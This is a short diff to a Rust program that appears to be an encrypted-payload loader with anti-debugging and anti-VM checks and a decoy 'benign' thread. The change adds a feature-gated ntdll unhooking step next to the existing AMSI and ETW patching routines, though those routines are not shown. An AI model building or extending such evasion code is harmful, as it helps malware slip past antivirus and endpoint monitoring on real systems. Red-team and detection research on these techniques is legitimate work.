@@ -15,7 +15,7 @@ mod utilities;
 #[cfg(any(feature = "CheckAntiDebugProcessDebugFlags", feature = "CheckAntiDebugSystemDebugControl", feature = "CheckAntiDebugRemoteDebugger", feature = "CheckAntiDebugNtGlobalFlag", feature = "CheckAntiDebugProcessList", feature = "CheckAntiDebugHardwareBreakpoints", feature = "CheckAntiVMCPU", feature = "CheckAntiVMRAM", feature = "CheckAntiVMUSB", feature = "CheckAntiVMProcesses", feature = "CheckDomainJoined"))]
 mod checks;
 
-#[cfg(any(feature = "EvasionAMSISimplePatch", feature = "EvasionETWSimple"))]
+#[cfg(any(feature = "EvasionAMSISimplePatch", feature = "EvasionETWSimple", feature = "EvasionNtdllUnhooking"))]
 mod evasion;
 
 // AES encryption support
@@ -32,8 +32,13 @@ mod args;
 const ENCPAYLOAD: &[u8] = &[];
 
 /// Run all enabled evasion techniques
-#[cfg(any(feature = "EvasionAMSISimplePatch", feature = "EvasionETWSimple"))]
+#[cfg(any(feature = "EvasionAMSISimplePatch", feature = "EvasionETWSimple", feature = "EvasionNtdllUnhooking"))]
 fn run_evasion_techniques() {
+    #[cfg(feature = "EvasionNtdllUnhooking")]
+    {
+        let _ = evasion::amsi::unhook_ntdll();
+    }
+
     #[cfg(feature = "EvasionAMSISimplePatch")]
     {
         let _ = evasion::amsi::patch_amsi();
@@ -66,9 +71,9 @@ fn main() {
     benign::start_benign_thread();
 
     // =======================================================================
-    // Evasion techniques (AMSI/ETW patching)
+    // Evasion techniques
     // =======================================================================
-    #[cfg(any(feature = "EvasionAMSISimplePatch", feature = "EvasionETWSimple"))]
+    #[cfg(any(feature = "EvasionAMSISimplePatch", feature = "EvasionETWSimple", feature = "EvasionNtdllUnhooking"))]
     run_evasion_techniques();
 
     // =======================================================================
